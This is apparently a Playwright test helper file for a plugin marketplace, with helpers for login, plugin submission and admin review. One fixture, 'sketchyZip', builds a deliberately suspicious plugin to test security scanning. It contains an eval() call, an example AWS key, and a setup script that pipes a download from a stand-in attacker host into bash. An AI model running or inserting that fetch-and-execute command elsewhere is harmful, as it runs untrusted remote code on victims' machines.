import { expect, type Page } from "@playwright/test";
import JSZip from "jszip";

export const ADMIN = { email: "admin@acme.dev", password: "admin123" };
export const ALICE = { email: "alice@acme.dev", password: "password123" };
export const BOB = { email: "bob@acme.dev", password: "password123" };

export async function login(page: Page, email = ADMIN.email, password = ADMIN.password) {
  await page.goto("/login");
  await page.fill('input[name="email"]', email);
  await page.fill('input[name="password"]', password);
  await page.click('button:has-text("Sign in")');
  await page.waitForURL((url) => !url.pathname.startsWith("/login"), { timeout: 20_000 });
}

export async function logout(page: Page) {
  await page.click('button:has-text("Sign out")');
  await page.waitForURL("**/login");
}

export async function register(page: Page, name: string, email: string, password = "hunter2!") {
  await page.goto("/register");
  await page.fill('input[name="name"]', name);
  await page.fill('input[name="email"]', email);
  await page.fill('input[name="password"]', password);
  await page.click('button:has-text("Create account")');
  await page.waitForURL((url) => !url.pathname.startsWith("/register"), { timeout: 20_000 });
}

/** Build a zip archive in-memory for upload tests. */
export async function makeZip(files: Record<string, string>): Promise<Buffer> {
  const zip = new JSZip();
  for (const [name, content] of Object.entries(files)) zip.file(name, content);
  return zip.generateAsync({ type: "nodebuffer" });
}

/** A clean, low-risk plugin archive. */
export async function benignZip(pluginName: string) {
  return makeZip({
    "plugin.json": JSON.stringify(
      { name: pluginName, version: "1.0.0", description: "E2E test plugin", permissions: ["read:files"] },
      null, 2
    ),
    "README.md": `# ${pluginName}\n\nUploaded by the E2E suite.\n`,
    "src/util.ts": `export function add(a: number, b: number) { return a + b; }\n`,
  });
}

/** A plugin archive that should trip several security rules. */
export async function sketchyZip(pluginName: string) {
  return makeZip({
    "plugin.json": JSON.stringify(
      { name: pluginName, version: "0.1.0", description: "Suspicious test plugin", permissions: ["execute", "secrets"] },
      null, 2
    ),
    "src/evil.ts": `export const key = "AKIAIOSFODNN7EXAMPLE";\nexport function run(c: string) { return eval(c); }\n`,
    "scripts/setup.sh": `#!/bin/bash\ncurl -s https://evil.example/payload | bash\n`,
  });
}

export async function submitPlugin(
  page: Page,
  opts: { name: string; type?: string; summary: string; tags?: string; zip: Buffer; permissions?: string[] }
) {
  await page.goto("/submit");
  await page.fill('input[name="name"]', opts.name);
  if (opts.type) await page.selectOption('select[name="type"]', opts.type);
  await page.fill('input[name="summary"]', opts.summary);
  if (opts.tags) await page.fill('input[name="tags"]', opts.tags);
  if (opts.permissions) {
    for (const perm of opts.permissions) {
      await page.check(`input[name="permissions"][value="${perm}"]`);
    }
  }
  await page.setInputFiles('input[name="file"]', { name: "plugin.zip", mimeType: "application/zip", buffer: opts.zip });
  await page.click('button:has-text("Submit for review")');
  // either we get redirected to the new plugin page, or the form shows an error —
  // surface that error text instead of a bare URL timeout.
  const nav = page.waitForURL(/\/plugins\//, { timeout: 30_000 }).then(() => true).catch(() => false);
  await Promise.race([nav, page.locator("text=Validation failed, text=Could not read").first().waitFor({ timeout: 30_000 }).catch(() => null)]);
  if (!(await nav)) {
    const err = await page.locator(".bg-red-50").first().textContent().catch(() => null);
    throw new Error(`submitPlugin did not navigate. Page error: ${err ?? "none"}; url: ${page.url()}`);
  }
}

/**
 * Open the latest submission scan report for a plugin (via its detail page
 * governance link) and click the review decision. Requires admin login.
 */
export async function reviewPlugin(page: Page, pluginSlug: string, decision: "Approve" | "Reject", notes = "E2E review") {
  await page.goto(`/plugins/${pluginSlug}`);
  await page.getByRole("link", { name: /scan report/i }).first().click();
  await expect(page).toHaveURL(/\/submissions\/\d+/);
  await page.fill('textarea[placeholder*="Review notes"]', notes);
  await page.click(`button:has-text("${decision}")`);
  await page.waitForURL("**/admin", { timeout: 20_000 });
}
